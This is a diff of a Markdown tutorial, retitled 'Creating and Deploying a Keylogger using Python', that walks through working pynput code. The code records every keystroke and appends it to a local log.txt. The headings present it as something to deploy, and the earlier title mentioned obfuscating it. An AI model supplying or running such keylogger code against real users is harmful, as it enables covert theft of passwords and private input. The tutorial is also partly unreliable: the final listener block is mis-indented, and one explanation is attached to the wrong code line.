@@ -1,6 +1,8 @@
-## Creating and Obfuscating a Keylogger using Python
+# Creating and Deploying a Keylogger using Python
 
-## INDEX
+## Introduction
+
+## OBJECTIVES
 - Importing Required Module
 - Defining 'log-keystroke' Function
 - Handling Special Keys
@@ -8,13 +10,13 @@
 - Starting Key Listener
 - Summary
 
-## 1. Importing Required Modules
+### 1. Importing Required Modules
     
     from pynput.keyboard import Listener
 
 This line imports the Listener class from the pynput.keyboard module. pynput is a library used to control and monitor input devices like the keyboard and mouse in Python. The Listener class allows us to monitor keyboard events such as key presses.
 
-## 2. Defining 'log-keystroke' Function
+### 2. Defining 'log-keystroke' Function
 
     def log_keystroke(key):
         key = str(key).replace("'", "")
@@ -25,7 +27,7 @@ This is the beginning of a function called log_keystroke, which will handle each
 
 The key parameter represents the key that was pressed. It's converted to a string, and any single quotes (') are removed. This is done because keys are often represented as strings in the form "'a'", and we want to clean this up for easier reading and logging.
 
-## 3. Handling Special Keys
+### 3. Handling Special Keys
 
     if key == 'Key.space':
         key = ' '
@@ -66,7 +68,7 @@ If the pressed key is the tab key (Key.tab), it replaces it with an empty string
 
 If the pressed key is the backspace key (Key.backspace), it replaces it with an empty string.
 
-## 4. Logging The Keystrokes
+### 4. Logging The Keystrokes
       
       with open("log.txt", 'a') as f:
         f.write(key)
@@ -74,7 +76,7 @@ This part of the function opens a file named log.txt in append mode ('a').
 <b>with open("log.txt", 'a') as f:</b>
 This line writes the processed key (after any necessary replacements) to the file. Each key press is logged sequentially.
 
-## 5. Starting the Key Listner
+### 5. Starting the Key Listner
     with Listener(on_press=log_keystroke) as l:
     l.join()
 This part of the code sets up the keyboard listener:
